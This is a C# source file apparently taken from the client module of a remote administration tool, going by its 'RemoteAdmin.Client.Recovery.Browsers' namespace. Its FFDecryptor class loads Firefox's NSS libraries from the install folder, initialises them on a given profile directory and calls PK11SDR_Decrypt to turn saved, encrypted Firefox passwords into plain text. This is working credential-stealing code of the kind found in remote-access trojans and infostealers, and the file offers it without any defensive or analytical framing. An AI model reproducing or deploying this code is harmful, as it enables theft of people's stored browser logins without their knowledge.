using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Utils;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Firefox credentials using NSS libraries
    /// </summary>
    public class FFDecryptor : IDisposable
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;
        private NssShutdown NSS_Shutdown;
        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;

        /// <summary>
        /// Initialize the NSS library for decryption
        /// </summary>
        public long Init(string configDirectory)
        {
            try
            {
                // Try multiple possible Firefox installation paths
                string[] possiblePaths = new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Mozilla Firefox\"),
                };

                string mozillaPath = null;
                foreach (var path in possiblePaths)
                {
                    if (Directory.Exists(path) && File.Exists(Path.Combine(path, "nss3.dll")))
                    {
                        mozillaPath = path;
                        break;
                    }
                }

                if (mozillaPath == null)
                {
                    throw new Exception("Firefox installation not found");
                }

                // Load the required DLLs
                Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
                NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));

                if (NSS3 == IntPtr.Zero)
                {
                    throw new Exception("Failed to load nss3.dll");
                }

                // Get function pointers
                IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
                IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
                IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");

                if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
                {
                    throw new Exception("Failed to get NSS function pointers");
                }

                // Create delegates
                NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
                PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
                NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));

                // Initialize NSS with the profile directory
                return NSS_Init(configDirectory);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to initialize NSS: {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Decrypt a base64-encoded encrypted string
        /// </summary>
        public string Decrypt(string cypherText)
        {
            if (string.IsNullOrEmpty(cypherText))
                return null;

            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.UTF8.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    NSS_Shutdown?.Invoke();
                }
                catch { }

                try
                {
                    if (NSS3 != IntPtr.Zero)
                        NativeMethods.FreeLibrary(NSS3);
                    if (Mozglue != IntPtr.Zero)
                        NativeMethods.FreeLibrary(Mozglue);
                }
                catch { }
            }
        }
    }
}